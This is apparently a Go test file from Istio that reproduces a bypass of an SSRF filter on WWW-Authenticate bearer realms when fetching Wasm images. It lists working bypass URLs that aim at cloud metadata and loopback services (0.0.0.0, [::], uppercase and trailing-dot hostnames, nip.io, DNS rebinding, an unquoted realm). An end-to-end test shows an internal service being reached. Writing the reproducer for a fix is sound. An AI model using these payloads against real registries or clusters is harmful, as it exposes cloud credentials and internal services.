//go:build zeroday_repro

// Copyright Istio Authors
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

// Zero-day reproducer (F1): the custom SSRF filter added at
// pkg/wasm/imagefetcher.go ("wrap transport with SSRF protection for CVE-pending
// bearer realm vulnerability") is trivially bypassable. This test calls the REAL
// unexported functions validateAllRealms / validateRealmURL and drives the REAL
// ssrfProtectionTransport.RoundTrip end-to-end.
//
// Run with:  go test -tags zeroday_repro -run TestZeroDay ./pkg/wasm/ -v
package wasm

import (
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

func wwwAuthHeader(realm string) string {
	return fmt.Sprintf(`Bearer realm="%s",service="registry.example.com",scope="repository:x:pull"`, realm)
}

// TestZeroDaySSRFFilterBypass exercises the ACTUAL validateAllRealms (from imagefetcher.go).
func TestZeroDaySSRFFilterBypass(t *testing.T) {
	blocked := []struct{ name, realm string }{
		{"literal cloud-metadata IP", "http://169.254.169.254/latest/meta-data/"},
		{"literal loopback IP", "http://127.0.0.1:15000/"},
		{"lowercase localhost", "http://localhost:15000/"},
		{"exact metadata host", "http://metadata.google.internal/computeMetadata/v1/"},
	}
	for _, c := range blocked {
		if err := validateAllRealms(wwwAuthHeader(c.realm)); err == nil {
			t.Errorf("[baseline] %s: expected BLOCK, filter ALLOWED %q", c.name, c.realm)
		}
	}

	// These SHOULD be blocked by any correct SSRF control, but the real filter ALLOWS them.
	bypasses := []struct{ name, realm string }{
		{"uppercase LOCALHOST", "http://LOCALHOST:15000/"},
		{"uppercase metadata host", "http://Metadata.Google.Internal/computeMetadata/v1/"},
		{"trailing-dot metadata FQDN", "http://metadata.google.internal./computeMetadata/v1/"},
		{"0.0.0.0 (loopback on linux)", "http://0.0.0.0:15000/"},
		{"IPv6 unspecified [::]", "http://[::]:15000/"},
		{"DNS name -> internal (dns rebinding)", "http://metadata.evil.example.com/"},
		{"nip.io -> 169.254.169.254", "http://169.254.169.254.nip.io/latest/meta-data/"},
		{"unquoted realm (parser differential)", "unused"}, // handled specially below
	}
	for _, c := range bypasses {
		var header string
		if c.name == "unquoted realm (parser differential)" {
			header = `Bearer realm=http://169.254.169.254/,service="r"`
		} else {
			header = wwwAuthHeader(c.realm)
		}
		if err := validateAllRealms(header); err != nil {
			t.Logf("[bypass] %s: filter happened to block (%v)", c.name, err)
		} else {
			t.Logf("[BYPASS CONFIRMED] %s: filter ALLOWED %q", c.name, c.realm)
		}
	}
}

// TestZeroDaySSRFEndToEnd drives the REAL ssrfProtectionTransport.RoundTrip. A malicious
// "registry" returns 401 with a bearer realm pointing (via 0.0.0.0) at a loopback-only
// internal service; the gate lets it through and the internal service is reached.
func TestZeroDaySSRFEndToEnd(t *testing.T) {
	var internalHit bool
	internal := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		internalHit = true
		fmt.Fprint(w, `{"token":"SENSITIVE-INTERNAL-DATA"}`)
	}))
	defer internal.Close()
	_, port, _ := net.SplitHostPort(strings.TrimPrefix(internal.URL, "http://"))

	// 0.0.0.0 passes the filter but connects to loopback on Linux.
	realm := fmt.Sprintf("http://0.0.0.0:%s/token", port)
	registry := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("WWW-Authenticate", wwwAuthHeader(realm))
		w.WriteHeader(http.StatusUnauthorized)
	}))
	defer registry.Close()

	// Exactly how imagefetcher.go wires the guard: remote.WithTransport(&ssrfProtectionTransport{...})
	client := &http.Client{Transport: &ssrfProtectionTransport{inner: http.DefaultTransport}}

	resp, err := client.Get(registry.URL + "/v2/")
	if err != nil {
		t.Fatalf("SSRF gate blocked the 401 (mitigation worked): %v", err)
	}
	resp.Body.Close()

	// go-containerregistry then GETs the realm (token refresh) through the same transport.
	tok, err := client.Get(realm + "?scope=repository:x:pull&service=registry.example.com")
	if err == nil {
		tok.Body.Close()
	}

	if !internalHit {
		t.Fatalf("internal service was NOT reached; bypass failed")
	}
	t.Log("*** SSRF CONFIRMED via real ssrfProtectionTransport: internal loopback service reached ***")
}
